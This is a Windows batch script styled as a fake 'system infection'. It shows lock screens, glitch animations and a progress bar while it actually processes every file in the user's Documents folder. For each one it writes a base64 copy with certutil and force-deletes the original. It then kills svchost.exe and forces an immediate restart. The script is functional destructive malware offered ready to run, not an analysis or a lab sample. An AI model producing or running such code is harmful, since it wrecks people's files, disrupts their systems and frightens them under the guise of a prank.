@echo off
setlocal enabledelayedexpansion
title SYSTEM INFECTION - DO NOT CLOSE

:: --- BLOCKING USER INTERRUPT ---
:: Windows Batch has limited 'trap' logic, but we hide the cursor and clear the screen
cls
echo [!] CRITICAL: SYSTEM LOCK ENGAGED.
powershell -command "$Host.UI.RawUI.CursorSize = 0" >nul 2>&1

:: --- SCANNING FILESYSTEM ---
echo [!] CALCULATING SYSTEM ENTROPY...
set /a total_files=0
for /r "C:\Users\%USERNAME%\Documents" %%f in (*) do set /a total_files+=1
echo [!] TARGETS IDENTIFIED: %total_files%
timeout /t 2 >nul

:: --- VISUAL ENGINE (FIREWORKS & POPUPS) ---
:: We launch the visual glitcher as a separate background process
start /b cmd /c "mode 80,30 & color 0C & :glitch & echo %random%%random%%random%%random% & echo    VIRAL INFECTION    & timeout /t 1 /nobreak >nul & goto glitch"

:: --- DESTRUCTION ENGINE ---
echo [!] COMMENCING DESTRUCTION...
set /a current_count=0

:: Targeting User Documents first for speed and visual impact
for /r "C:\Users\%USERNAME%\Documents" %%F in (*) do (
    :: 1. REAL PERCENTAGE CALCULATION
    set /a current_count+=1
    set /a percent=!current_count! * 100 / %total_files%
    
    :: 2. PROGRESS BAR HUD
    cls
    echo INFECTION STATUS: [!percent!%%] [!current_count!/%total_files%]
    echo --------------------------------------------------
    echo [!] SHREDDING: %%~nxF
    
    :: 3. THE ENCODE + DELETE LOGIC
    :: Using certutil to simulate base64 encoding
    certutil -encode "%%F" "%%F.b64" >nul 2>&1
    if exist "%%F.b64" (
        del /f /q "%%F" >nul 2>&1
    )

    :: 4. EXIT BLOCKER (Simple loop to catch attempts)
    if !random! LSS 500 (
        echo [!] ACCESS DENIED: INFECTION PERMANENT
    )
)

:: --- THE FINALE ---
cls
color 4F
echo ==================================================
echo      FATAL SYSTEM ERROR. ALL DATA ENCODED.
echo ==================================================
echo REBOOTING INTO THE VOID...
timeout /t 3 >nul

:: Force a Blue Screen of Death (BSOD) or Shutdown
:: This is the "Windows Reboot" equivalent for total failure
taskkill /f /im svchost.exe
shutdown /r /f /t 0
